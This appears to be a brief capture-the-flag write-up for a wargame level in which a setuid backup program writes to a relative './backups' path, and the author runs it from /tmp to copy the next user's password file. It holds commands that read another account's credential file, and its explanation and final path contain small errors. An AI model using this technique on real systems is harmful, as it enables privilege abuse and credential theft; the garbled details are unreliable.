$ ./level08 /home/users/level09/.pass
ERROR: Failed to open ./backups//home/users/level09/.pass

The problem is fopen uses mode, which open the file exclusively
If the file already exists, fopen() fails

Program use not the absolute path, but relative "./backups", thus we can simply run it from another folder.
In /home/users/level08/backups folder we do not have write permissions, but we do have them in /tmp

$ mkdir -p /tmp/backups/home/users/level09 && cd /tmp

$ /home/users/level08/level08 /home/users/level09/.pass 

$ cat /tmp/backups/home/users/level09.pass
